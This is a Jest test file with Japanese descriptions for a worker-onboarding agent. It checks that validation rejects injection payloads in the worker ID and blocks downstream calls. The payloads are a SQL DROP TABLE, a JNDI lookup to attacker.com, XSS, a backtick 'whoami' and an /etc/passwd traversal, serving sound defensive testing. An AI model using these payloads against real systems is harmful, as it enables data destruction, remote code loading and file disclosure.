import { runTx5Imp1Agent } from '../../src/agents/tx-5-imp-1/orchestrator';
import { InvalidOnboardingDataError } from '../../src/logic/authorization-and-validation';

// Mock the validation module
jest.mock('../../src/logic/authorization-and-validation', () => ({
  validateInputData: jest.fn(),
  InvalidOnboardingDataError: class InvalidOnboardingDataError extends Error {
    constructor(message: string) {
      super(message);
      this.name = 'InvalidOnboardingDataError';
    }
  },
}));

const { validateInputData } = require('../../src/logic/authorization-and-validation');

describe('SCEN-059: プロンプトインジェクション対策のバリデーション検証', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('新配属者IDにプロンプトインジェクションペイロードが含まれる場合', () => {
    it('バリデーション処理によってエラーが検出される', async () => {
      // Arrange: プロンプトインジェクションペイロードを含む入力
      const injectionPayloads = [
        "'; DROP TABLE workers; --",
        '${jndi:ldap://attacker.com/a}',
        '<script>alert("xss")</script>',
        'worker_id"; DROP TABLE --',
      ];

      const validFields = {
        jobClassification: 'type-001',
        assignedSiteId: 'site-123',
        assignedTeamId: 'team-456',
        assignedDepartmentId: 'dept-789',
        assignmentStartDate: '2024-01-15T09:00:00Z',
        executingUserId: 'admin-001',
        historicalDataLookbackDays: 90,
      };

      for (const payload of injectionPayloads) {
        const input = {
          newAssigneeWorkerId: payload,
          ...validFields,
        };

        // validateInputData をスタブして例外をスロー
        const error = new InvalidOnboardingDataError(
          '配属情報が不完全です。作業者ID、職務分類、拠点IDを確認してください。'
        );
        validateInputData.mockImplementation(() => {
          throw error;
        });

        // Act & Assert
        await expect(runTx5Imp1Agent(input, {} as any)).rejects.toThrow(
          InvalidOnboardingDataError
        );

        await expect(runTx5Imp1Agent(input, {} as any)).rejects.toThrow(
          '配属情報が不完全です。作業者ID、職務分類、拠点IDを確認してください。'
        );

        // validateInputData が呼び出されたことを確認
        expect(validateInputData).toHaveBeenCalledWith(expect.objectContaining({
          newAssigneeWorkerId: payload,
        }));
      }
    });

    it('エラー発生時は初期割当案の生成処理が実行されない', async () => {
      // Arrange
      const input = {
        newAssigneeWorkerId: "'; DROP TABLE workers; --",
        jobClassification: 'type-001',
        assignedSiteId: 'site-123',
        assignedTeamId: 'team-456',
        assignedDepartmentId: 'dept-789',
        assignmentStartDate: '2024-01-15T09:00:00Z',
        executingUserId: 'admin-001',
        historicalDataLookbackDays: 90,
      };

      const error = new InvalidOnboardingDataError(
        '配属情報が不完全です。作業者ID、職務分類、拠点IDを確認してください。'
      );
      validateInputData.mockImplementation(() => {
        throw error;
      });

      // Mock downstream operations
      const mockAiClient = {
        findWorkersByClassificationAndSite: jest.fn(),
        findProductivityDataByWorkerIds: jest.fn(),
        saveInitialAssignment: jest.fn(),
        analyzeOnboardingContextAndExtractPeerPerformancePatterns: jest.fn(),
        sendNotificationToAdministrator: jest.fn(),
        retrieveLatestValidCacheForPlacementGeneration: jest.fn(),
      };

      // Act & Assert
      await expect(runTx5Imp1Agent(input, mockAiClient as any)).rejects.toThrow(
        InvalidOnboardingDataError
      );

      // 後続の処理が実行されていないことを確認
      expect(mockAiClient.findWorkersByClassificationAndSite).not.toHaveBeenCalled();
      expect(mockAiClient.findProductivityDataByWorkerIds).not.toHaveBeenCalled();
      expect(mockAiClient.saveInitialAssignment).not.toHaveBeenCalled();
      expect(mockAiClient.analyzeOnboardingContextAndExtractPeerPerformancePatterns).not.toHaveBeenCalled();
      expect(mockAiClient.sendNotificationToAdministrator).not.toHaveBeenCalled();
      expect(mockAiClient.retrieveLatestValidCacheForPlacementGeneration).not.toHaveBeenCalled();
    });

    it('複数のインジェクション手法すべてが検出される', async () => {
      // Arrange
      const testCases = [
        { payload: "'; DROP TABLE workers; --", description: 'SQL インジェクション' },
        { payload: '${jndi:ldap://attacker.com/a}', description: 'JNDI インジェクション' },
        { payload: '`whoami`', description: 'コマンドインジェクション' },
        { payload: '../../../etc/passwd', description: 'パストラバーサル' },
      ];

      const validFields = {
        jobClassification: 'type-001',
        assignedSiteId: 'site-123',
        assignedTeamId: 'team-456',
        assignedDepartmentId: 'dept-789',
        assignmentStartDate: '2024-01-15T09:00:00Z',
        executingUserId: 'admin-001',
      };

      // Act & Assert
      for (const testCase of testCases) {
        const input = {
          newAssigneeWorkerId: testCase.payload,
          ...validFields,
        };

        const error = new InvalidOnboardingDataError(
          '配属情報が不完全です。作業者ID、職務分類、拠点IDを確認してください。'
        );
        validateInputData.mockImplementation(() => {
          throw error;
        });

        await expect(
          runTx5Imp1Agent(input, {} as any)
        ).rejects.toThrow(InvalidOnboardingDataError);

        expect(validateInputData).toHaveBeenCalledWith(
          expect.objectContaining({ newAssigneeWorkerId: testCase.payload })
        );
      }
    });
  });
});